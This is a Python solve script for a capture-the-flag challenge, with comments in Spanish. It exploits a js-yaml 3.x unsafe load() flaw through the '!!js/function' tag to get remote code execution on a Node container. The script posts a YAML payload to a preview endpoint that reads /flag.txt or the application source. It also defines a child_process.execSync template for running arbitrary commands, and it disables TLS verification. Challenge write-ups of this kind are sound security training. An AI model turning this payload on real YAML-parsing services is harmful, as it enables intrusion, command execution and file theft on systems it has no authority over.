#!/usr/bin/env python3
"""Solucion del reto ANCI 'Punto Ciego' (HackRocks blind-spot).

Vulnerabilidad: la vista previa YAML usa js-yaml 3.x con `load()` (esquema
inseguro, DEFAULT_FULL_SCHEMA). La etiqueta `!!js/function` crea una funcion
JavaScript a partir del documento; el normalizador la invoca, logrando RCE
como el usuario `node` del contenedor.

Uso:
    python solve.py            # lee /flag.txt y muestra la flag
    python solve.py app        # descarga /app/app.js a app_source.js
"""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<host>/blind-spot"
HEADERS = {"User-Agent": "Mozilla/5.0", "Content-Type": "text/yaml"}


def yaml_exec(js_expr, tries=40):
    """Ejecuta js_expr dentro de una !!js/function y devuelve el resultado."""
    doc = "preview: !!js/function 'function(){ return %s }'\n" % js_expr.replace("'", "\\'")
    for _ in range(tries):
        try:
            r = requests.post(BASE + "/api/preview", data=doc.encode(),
                              headers=HEADERS, timeout=15, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.25)
                continue
            data = r.json()
            if "preview" in data:
                return data["preview"]
            return data
        except Exception:
            time.sleep(0.25)
    raise SystemExit("servicio no disponible tras varios reintentos")


READ = 'process.mainModule.require("fs").readFileSync(%s,"utf8")'
EXEC = 'process.mainModule.require("child_process").execSync(%s).toString()'

if __name__ == "__main__":
    what = sys.argv[1] if len(sys.argv) > 1 else "flag"
    if what == "app":
        src = yaml_exec(READ % '"/app/app.js"')
        open("app_source.js", "w", encoding="utf-8").write(src)
        print(f"app.js guardado ({len(src)} bytes) en app_source.js")
    else:
        out = yaml_exec(READ % '"/flag.txt"')
        print(out.strip())
